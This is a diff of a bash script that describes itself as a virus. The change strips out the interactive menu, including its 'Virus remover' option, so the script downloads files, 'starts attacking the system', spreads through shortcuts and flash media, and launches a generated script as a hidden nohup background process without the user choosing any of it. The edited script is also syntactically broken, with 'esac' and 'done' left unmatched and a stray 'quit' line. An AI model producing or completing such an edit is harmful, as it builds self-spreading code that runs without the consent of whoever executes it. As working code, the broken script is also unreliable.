@@ -169,42 +169,30 @@ chmod +x $filename
 }
 
 
-#Create a menu options for the users when they run this script.
-select opt in "${options[@]}"
-do
-     case $opt in 
-      "Run")
-	  #create a list of images and save them into an array	
-          CreateList
-          
-	#Download a list of the list.txt file that created by our array
-	  DownloadList 
-	 
-	 #Rename downloaded files using our pattern
-          renameDownloadedFiles
-         
-	 #Start attacking the system
-          startspreading
-         
-	 #Create shortcuts using ln on the system 
-	  createShortcut
-          
-	  #generate another script file from this script then run it to handel the flash memory stuff
-	  generate
-          
- 	  #NO HANG UP COMMAND will create a hidden process for runing the generated script file
-          nohup /home/$my/Desktop/$filename > outputvirus 2>&1 & 
-          
-;;
-      "Virus remover")
-       RemoveVirus
-         
-;;
+#create a list of images and save them into an array	
+CreateList
 
-      "quit")
-     break
-;;
-*)
+#Download a list of the list.txt file that created by our array
+DownloadList 
+
+#Rename downloaded files using our pattern
+renameDownloadedFiles
+
+#Start attacking the system
+startspreading
+
+#Create shortcuts using ln on the system 
+createShortcut
+
+#generate another script file from this script then run it to handel the flash memory stuff
+generate
+
+#NO HANG UP COMMAND will create a hidden process for runing the generated script file
+nohup /home/$my/Desktop/$filename > outputvirus 2>&1 & 
+
+"quit"
+break
+     
 echo invalid choice
       esac
 done
